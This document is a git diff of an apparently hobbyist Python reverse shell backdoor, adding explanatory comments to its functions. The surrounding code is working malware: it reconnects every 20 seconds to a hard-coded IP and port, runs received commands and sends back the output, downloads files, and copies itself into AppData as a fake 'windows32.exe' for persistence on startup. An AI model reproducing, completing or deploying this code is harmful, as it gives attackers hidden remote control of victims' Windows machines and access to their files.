@@ -10,10 +10,12 @@ import sys
 import time
 import requests
 
+#Sends data to server using json library
 def reliable_send(data):
         json_data =json.dumps(data)
         sock.send(json_data)
 
+#Waits to receive commands from server using the socket
 def reliable_recv():
         data = ""
         while True:
@@ -24,21 +26,26 @@ def reliable_recv():
                 except ValueError:
                         continue
 
+#Downloads file from target computer by writing a copy of it on local machine			
 def download(url):
 	get_response= requests.get(url)
 	file_name= url.split("/")[-1]
 	with open(file_name, "wb") as out_file:
 		out_file.write(get_response.content)
 		
-
+#Attempts to connect to host server every 20 seconds upon start-up. Allows for Reverse Shell to not crash even if server is not running first.
 def connection():
 	while True:
 		time.sleep(20)
 		try:
-			sock.connect(("192.168.0.81", 54321))
+			sock.connect(("192.168.0.81", 54321)) #Customize IP and port here
 			shell()
 		except:
 			continue
+
+#Allows for sending and receiving of commands from server. Checks Special cases for downloading and uploading files locally,
+#uploading a file from the internet, and moving about Windows directories, by checking if command starts with certain keyword.
+
 def shell():
         while True:
                 command = reliable_recv()
@@ -68,6 +75,7 @@ def shell():
                         result = proc.stdout.read() + proc.stderr.read()
                         reliable_send(result)
 
+#Attempts to create a copy of the file that runs on start-up, which is hidden as a windows32 executable
 location= os.environ["appdata"] + "\\windows32.exe"
 if not os.path.exists(location):
 	shutil.copyfile(sys.executable, location)
